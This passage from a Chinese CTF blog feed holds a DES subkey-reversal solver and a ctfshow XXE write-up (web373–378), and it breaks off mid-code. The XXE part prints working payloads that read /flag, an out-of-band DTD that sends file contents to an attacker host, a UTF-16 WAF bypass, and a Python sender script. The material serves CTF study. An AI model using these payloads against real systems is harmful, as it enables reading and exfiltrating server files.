inline">\(2^8\)</span>种情况，完全可以爆破</p><p>注意，我们常说DES的密钥为64bit，但是这道题中，我们不需要逆推出剩余的8位校验位，PC_1置换也没必要逆推。</p><p>全排列我用的是回溯法，正好刚考完算法。</p><p>最后代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> truediv<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">import</span> pyDes<br><span class="hljs-keyword">import</span> base64<br><br><br>PC_1 = [<br>        <span class="hljs-number">57</span>, <span class="hljs-number">49</span>, <span class="hljs-number">41</span>, <span class="hljs-number">33</span>, <span class="hljs-number">25</span>, <span class="hljs-number">17</span>,  <span class="hljs-number">9</span>,  <span class="hljs-number">1</span>, <br>        <span class="hljs-number">58</span>, <span class="hljs-number">50</span>, <span class="hljs-number">42</span>, <span class="hljs-number">34</span>, <span class="hljs-number">26</span>, <span class="hljs-number">18</span>, <span class="hljs-number">10</span>,  <span class="hljs-number">2</span>, <br>        <span class="hljs-number">59</span>, <span class="hljs-number">51</span>, <span class="hljs-number">43</span>, <span class="hljs-number">35</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">11</span>,  <span class="hljs-number">3</span>,<br>        <span class="hljs-number">60</span>, <span class="hljs-number">52</span>, <span class="hljs-number">44</span>, <span class="hljs-number">36</span>, <span class="hljs-number">63</span>, <span class="hljs-number">55</span>, <span class="hljs-number">47</span>, <span class="hljs-number">39</span>, <br>        <span class="hljs-number">31</span>, <span class="hljs-number">23</span>, <span class="hljs-number">15</span>,  <span class="hljs-number">7</span>, <span class="hljs-number">62</span>, <span class="hljs-number">54</span>, <span class="hljs-number">46</span>, <span class="hljs-number">38</span>, <br>        <span class="hljs-number">30</span>, <span class="hljs-number">22</span>, <span class="hljs-number">14</span>,  <span class="hljs-number">6</span>, <span class="hljs-number">61</span>, <span class="hljs-number">53</span>, <span class="hljs-number">45</span>, <span class="hljs-number">37</span>,<br>        <span class="hljs-number">29</span>, <span class="hljs-number">21</span>, <span class="hljs-number">13</span>,  <span class="hljs-number">5</span>, <span class="hljs-number">28</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span>,  <span class="hljs-number">4</span><br>    ]<br><br>PC_2 = [<br>        <span class="hljs-number">14</span>, <span class="hljs-number">17</span>, <span class="hljs-number">11</span>, <span class="hljs-number">24</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">5</span>,  <span class="hljs-number">3</span>, <span class="hljs-number">28</span>, <br>        <span class="hljs-number">15</span>,  <span class="hljs-number">6</span>, <span class="hljs-number">21</span>, <span class="hljs-number">10</span>, <span class="hljs-number">23</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>,  <span class="hljs-number">4</span>, <br>        <span class="hljs-number">26</span>,  <span class="hljs-number">8</span>, <span class="hljs-number">16</span>,  <span class="hljs-number">7</span>, <span class="hljs-number">27</span>, <span class="hljs-number">20</span>, <span class="hljs-number">13</span>,  <span class="hljs-number">2</span>, <br>        <span class="hljs-number">41</span>, <span class="hljs-number">52</span>, <span class="hljs-number">31</span>, <span class="hljs-number">37</span>, <span class="hljs-number">47</span>, <span class="hljs-number">55</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <br>        <span class="hljs-number">51</span>, <span class="hljs-number">45</span>, <span class="hljs-number">33</span>, <span class="hljs-number">48</span>, <span class="hljs-number">44</span>, <span class="hljs-number">49</span>, <span class="hljs-number">39</span>, <span class="hljs-number">56</span>, <br>        <span class="hljs-number">34</span>, <span class="hljs-number">53</span>, <span class="hljs-number">46</span>, <span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">36</span>, <span class="hljs-number">29</span>, <span class="hljs-number">32</span><br>        ]<br><br><br>ROUNDS = <span class="hljs-number">16</span><br><br>R = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>]<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">chr_to_bits</span>(<span class="hljs-params">c</span>):</span><br>    res = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">list</span>(res.rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>)))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_bits</span>(<span class="hljs-params">s</span>):</span><br>    res = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        res.extend(chr_to_bits(c))<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bits_to_chr</span>(<span class="hljs-params">bits</span>):</span><br>    res = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, bits)), <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(res)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bits_to_str</span>(<span class="hljs-params">bits</span>):</span><br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bits), <span class="hljs-number">8</span>):<br>        res += bits_to_chr(bits[i:i+<span class="hljs-number">8</span>])<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_subkey</span>(<span class="hljs-params">key</span>):</span><br>    kbits = str_to_bits(key)<br>    kbits = [kbits[x-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> PC_1]<br>    left = kbits[:<span class="hljs-number">28</span>]<br>    right = kbits[<span class="hljs-number">28</span>:]<br>    subkeys = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROUNDS):<br>        left = left[R[i]:]+left[:R[i]]<br>        right = right[R[i]:]+right[:R[i]]<br>        cur = left+right<br>        subkeys.append([cur[x-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> PC_2])<br>    <span class="hljs-keyword">if</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">1</span>] <span class="hljs-keyword">or</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">2</span>]:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Boom&quot;</span>)<br>    <span class="hljs-keyword">return</span> subkeys<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_nextkey</span>(<span class="hljs-params">first_key</span>):</span><br>    left = first_key[:<span class="hljs-number">28</span>]<br>    right = first_key[<span class="hljs-number">28</span>:]<br>    subkeys = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROUNDS):  <br>        left = left[R[i]:]+left[:R[i]]<br>        right = right[R[i]:]+right[:R[i]]<br>        cur = left + right<br>        subkeys.append([cur[x-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> PC_2])<br>    <span class="hljs-keyword">if</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">1</span>] <span class="hljs-keyword">or</span> subkeys[<span class="hljs-number">0</span>] == subkeys[<span class="hljs-number">2</span>]:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Boom&quot;</span>)<br>    <span class="hljs-keyword">return</span> subkeys<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rev_subkeys</span>(<span class="hljs-params">kn,<span class="hljs-built_in">round</span></span>):</span><br>    cur = [<span class="hljs-number">2</span>] * <span class="hljs-number">56</span><br><br>    <span class="hljs-comment"># 逆PC2的置换</span><br>    <span class="hljs-comment"># kn[1] = cur[14] --&gt; cur[14] = kn[1]</span><br>    <span class="hljs-keyword">for</span> i,j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(PC_2):<br>        cur[j-<span class="hljs-number">1</span>] = kn[i]<br>    <br>    left = cur[:<span class="hljs-number">28</span>]<br>    right = cur[<span class="hljs-number">28</span>:]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">round</span> + <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 逆位移</span><br>        left = left[<span class="hljs-number">28</span> - R[<span class="hljs-built_in">round</span> - i]:] + left[:<span class="hljs-number">28</span> - R[<span class="hljs-built_in">round</span> - i]]<br>        right = right[<span class="hljs-number">28</span> - R[<span class="hljs-built_in">round</span> - i]:] + right[:<span class="hljs-number">28</span> - R[<span class="hljs-built_in">round</span> - i]]<br><br>    <span class="hljs-keyword">return</span> (left+right)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rec</span>(<span class="hljs-params">index</span>):</span><br>    <span class="hljs-keyword">if</span>(index == <span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">global</span> revkeys<br>        subkeys = gen_nextkey(revkeys)<br>        <span class="hljs-keyword">if</span>(subkeys[<span class="hljs-number">10</span>] == kn10):<br>            d = pyDes.des(<span class="hljs-string">&quot;********&quot;</span>)<br>            d.Kn = subkeys<br>            m = d.decrypt(cipher)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NCTF&#x27;</span> <span class="hljs-keyword">in</span> m:<br>                <span class="hljs-built_in">print</span>(m)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        revkeys[l[index]] = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span>(rec(index + <span class="hljs-number">1</span>)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            revkeys[l[index]] = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> rec(index + <span class="hljs-number">1</span>)<br>      <br><span class="hljs-comment"># 测试部分代码</span><br><span class="hljs-comment"># key = &quot;02244668&quot;</span><br><span class="hljs-comment"># flag = &quot;NCTF&#123;1t_7urn3d_0u7_7h47_u_2_g00d_@_r3v3rs3_1snt&#125;&quot;</span><br><span class="hljs-comment"># des = pyDes.des(key)</span><br><span class="hljs-comment"># cipher = des.encrypt(flag.encode())</span><br><span class="hljs-comment"># kn10 = des.Kn[10]</span><br><span class="hljs-comment"># print(cipher)</span><br><br>cipher = base64.b64decode(<span class="hljs-string">b&#x27;m0pT2YYUIaL0pjdaX2wsxwedViYAaBkZA0Rh3bUmNYVclBlvWoB8VYC6oSUjfbDN&#x27;</span>)<br>kn10 = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]<br><br>revkeys = rev_subkeys(kn10,<span class="hljs-number">10</span>)<br><br>l = []<br><span class="hljs-keyword">for</span> idx,i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(revkeys):<br>    <span class="hljs-keyword">if</span>(i == <span class="hljs-number">2</span>):<br>        l.append(idx)<br><br>key = <span class="hljs-string">&quot;&quot;</span><br>rec(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>推荐WP：<br /><a href="https://blog.csdn.net/m0_57291352/article/details/119280470">NCTF-REVERSE-WP</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>Crypto</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
      <tag>NSS</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-xxe-wp</title>
    <link href="/2022/08/13/blog0023-ctfshow-xxe-wp/"/>
    <url>/2022/08/13/blog0023-ctfshow-xxe-wp/</url>
    
    <content type="html"><![CDATA[<p>XXE漏洞开始了</p><p>推荐阅读博客：</p><p>https://xz.aliyun.com/t/3357#toc-6</p><span id="more"></span><h2 id="web373回显读文件">web373（回显读文件）</h2><p>首先来看PHP源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>libxml_disable_entity_loader(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);  <br></code></pre></td></tr></table></figure><p>我们只需要构造含有ctfshow这个元素的xml文档，利用外部实体从而读取文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">creds</span> [ </span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">creds</span> (<span class="hljs-meta-keyword">ctfshow</span>)&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">ctfshow</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">goodies</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span><br><span class="hljs-meta">]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样，就能成功把flag打出来。</p><h2 id="web374oob">web374（OOB）</h2><p>这道题就是经典的OOB外带，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>libxml_disable_entity_loader(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>首先在VPS上搭建xxe.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">int</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://your-ip:port?p=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注入的xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">convert</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://your-ip/xxe.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>vps上启动http服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Python3 -m http.server 2333<br></code></pre></td></tr></table></figure><p>需要注意的是<code>&amp;#37;</code>是HTML实体编码，对应的是<code>%</code></p><p>整个的调用顺序为</p><p><code>%remote</code> （包含远程服务器的dtd） --&gt; <code>%int</code> （包含send实体参数）--&gt; <code>%send</code>（包含file实体参数，访问远程服务器）</p><h2 id="web375oob">web375（OOB）</h2><p>过滤了"xml"的版本声明，但这并不影响。</p><p>同web374</p><h2 id="web376oob">web376（OOB）</h2><p>同web374</p><h2 id="web377utf-16">web377（UTF-16）</h2><p>先看看PHP源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>libxml_disable_entity_loader(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>这里非常重要的一点就是<code>http</code>协议被正则ban了，我们可以考虑利用编码绕过</p><pre><code class="hljs">    一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。    外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。</code></pre><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813225613713.png" alt="image-20220813225613713" style="zoom: 50%;" /></p><p>这时我们需要用上Python脚本了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> weakref <span class="hljs-keyword">import</span> proxy<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://f1a29458-0578-476a-825b-2ecc7fa52815.challenge.ctf.show/&quot;</span><br><br>url = <span class="hljs-string">&quot;http://127.0.0.1/xxe.php&quot;</span><br><br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;!DOCTYPE convert [ </span><br><span class="hljs-string">&lt;!ENTITY % remote SYSTEM &quot;http://121.5.227.123/xxe.dtd&quot;&gt;</span><br><span class="hljs-string">%remote;%int;%send;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>header = &#123;<br>    <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>r = requests.post(url=url,data=data.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>),proxies=proxies)<br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-comment"># print(data.encode(&#x27;utf-16&#x27;))</span><br></code></pre></td></tr></table></figure><h2 id="web378flask-xxe">web378（flask XXE）</h2><p>抓包发现，上传的用户名会回显，因此考虑XXE注入</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220814001604129.png" alt="image-20220814001604129" /></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">user</span> [ </span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span><br><span class="hljs-meta">]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>传入后成功拿到flag.</p><p>后端源代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 